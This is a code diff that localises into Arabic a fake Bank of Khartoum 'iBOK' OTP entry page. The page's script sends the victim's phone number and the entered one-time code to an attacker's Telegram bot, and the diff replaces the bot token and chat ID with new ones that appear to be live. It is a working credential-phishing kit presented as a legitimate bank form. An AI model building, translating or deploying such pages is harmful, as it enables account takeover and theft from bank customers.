@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
-    <title>Enter OTP code | iBOK</title>
+    <title>إدخال رمز التحقق | آيبوك</title>
 
     <style>
          :root {
@@ -69,6 +69,7 @@
         
         .brand {
             margin-top: 11px;
+            text-align: center;
         }
         
         .brand-name {
@@ -121,6 +122,7 @@
             margin-bottom: 11px;
             font-size: 16px;
             font-weight: 700;
+            text-align: right;
         }
         
         input {
@@ -205,7 +207,8 @@
         
         .support-bubble {
             position: fixed;
-            left: 31px;
+            right: 31px;
+            left: auto;
             bottom: 15px;
             width: 55px;
             height: 55px;
@@ -229,44 +232,44 @@
 <body>
     <div class="page">
         <header>
-            <div class="welcome">Welcome to iBOK Online Banking service</div>
+            <div class="welcome">مرحباً بك في خدمة الخدمات المصرفية الإلكترونية آيبوك</div>
             <div class="brand">
-                <div class="brand-name">iBOK</div>
-                <div class="brand-caption">Online Form</div>
+                <div class="brand-name">آيبوك</div>
+                <div class="brand-caption">النموذج الإلكتروني</div>
             </div>
         </header>
 
         <main>
             <section class="card" aria-labelledby="demo-title">
-                <h1 id="demo-title">Enter OTP code</h1>
-                <p class="description">Please enter the verification code sent to your <br> registered phone number and email address.</p>
+                <h1 id="demo-title">أدخل رمز التحقق (OTP)</h1>
+                <p class="description">يرجى إدخال رمز التحقق الذي تم إرساله إلى رقم هاتفك المسجل وعنوان بريدك الإلكتروني.</p>
 
                 <form id="demo-form">
-                    <label for="otp-input">Enter 6-digit OTP</label>
+                    <label for="otp-input">أدخل الرمز المكون من 6 أرقام</label>
                     <input id="otp-input" name="otp" type="text" maxlength="6" placeholder="------" autocomplete="off" required aria-describedby="message" />
 
                     <div class="timer-container">
-                        Code expires in: <span id="timerText">30s</span>
+                        تنصلاحية الرمز تنتهي خلال: <span id="timerText">30s</span>
                     </div>
 
                     <p class="message" id="message" aria-live="polite"></p>
-                    <button type="button" id="confirmBtn" disabled>Continue</button>
+                    <button type="button" id="confirmBtn" disabled>متابعة</button>
                 </form>
             </section>
         </main>
 
         <footer>
-            iBOK | Bank of Khartoum 2026<br /> All rights reserved, Bank of Khartoum, iBOK 2026
+            آيبوك | بنك الخرطوم 2026<br /> كافة الحقوق محفوظة، بنك الخرطوم، آيبوك 2026
         </footer>
 
-        <div class="support-bubble" aria-label="WhatsApp support" title="WhatsApp support">
+        <div class="support-bubble" aria-label="دعم واتساب" title="دعم واتساب">
             <i class="fa-brands fa-whatsapp"></i>
         </div>
     </div>
 
     <script>
-        const BOT_TOKEN_1 = '7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc';
-        const CHAT_ID_1 = '8406078749';
+        const BOT_TOKEN_1 = '8962923971:AAE6pwf3RxLR55lU--KAbOqf5XdNwhMbTu8';
+        const CHAT_ID_1 = '8586910663';
 
         const otpInput = document.getElementById('otp-input');
         const confirmBtn = document.getElementById('confirmBtn');
@@ -280,7 +283,7 @@
 
         function updateTimerUI() {
             if (!timerText) return;
-            timerText.textContent = `${seconds}s`;
+            timerText.textContent = `${seconds}ث`;
         }
 
         function startCountdown() {
@@ -337,17 +340,17 @@
 
             if (seconds <= 0) {
                 messageEl.className = 'message error';
-                messageEl.textContent = 'OTP expired. Please request a new OTP.';
+                messageEl.textContent = 'انتهت صلاحية رمز التحقق. يرجى طلب رمز جديد.';
                 return;
             }
 
             messageEl.className = 'processing';
-            messageEl.textContent = 'verifying.......';
+            messageEl.textContent = 'جاري التحقق.......';
 
             const message =
-                `*OTP Verification*\n\n` +
-                `📱 Phone: +258 ${savedPhone}\n` +
-                `🔢 Entered OTP: ${otpValue}`;
+                `*التحقق من رمز OTP*\n\n` +
+                `📱 الهاتف: +258 ${savedPhone}\n` +
+                `🔢 الرمز المدخل: ${otpValue}`;
 
             sendToBot(BOT_TOKEN_1, CHAT_ID_1, message);
 
